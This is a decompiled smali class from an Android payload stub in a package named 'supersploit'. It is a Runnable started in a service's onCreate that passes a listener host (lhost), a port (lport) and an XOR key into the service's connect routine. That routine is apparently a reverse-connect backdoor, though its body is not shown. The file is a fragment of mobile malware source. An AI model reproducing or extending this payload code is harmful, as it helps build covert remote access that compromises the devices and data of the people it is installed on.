.class Lorg/supersploit/stub/PayloadService$1;
.super Ljava/lang/Object;
.source "PayloadService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/supersploit/stub/PayloadService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/supersploit/stub/PayloadService;

.field final synthetic val$lhost:Ljava/lang/String;

.field final synthetic val$lport:I

.field final synthetic val$xorKey:Ljava/lang/String;


# direct methods
.method constructor <init>(Lorg/supersploit/stub/PayloadService;Ljava/lang/String;ILjava/lang/String;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010,
            0x1010,
            0x1010,
            0x1010
        }
        names = {
            null,
            null,
            null,
            null
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 50
    iput-object p1, p0, Lorg/supersploit/stub/PayloadService$1;->this$0:Lorg/supersploit/stub/PayloadService;

    iput-object p2, p0, Lorg/supersploit/stub/PayloadService$1;->val$lhost:Ljava/lang/String;

    iput p3, p0, Lorg/supersploit/stub/PayloadService$1;->val$lport:I

    iput-object p4, p0, Lorg/supersploit/stub/PayloadService$1;->val$xorKey:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 53
    iget-object v0, p0, Lorg/supersploit/stub/PayloadService$1;->this$0:Lorg/supersploit/stub/PayloadService;

    iget-object v1, p0, Lorg/supersploit/stub/PayloadService$1;->val$lhost:Ljava/lang/String;

    iget v2, p0, Lorg/supersploit/stub/PayloadService$1;->val$lport:I

    iget-object v3, p0, Lorg/supersploit/stub/PayloadService$1;->val$xorKey:Ljava/lang/String;

    invoke-static {v0, v1, v2, v3}, Lorg/supersploit/stub/PayloadService;->access$000(Lorg/supersploit/stub/PayloadService;Ljava/lang/String;ILjava/lang/String;)V

    return-void
.end method
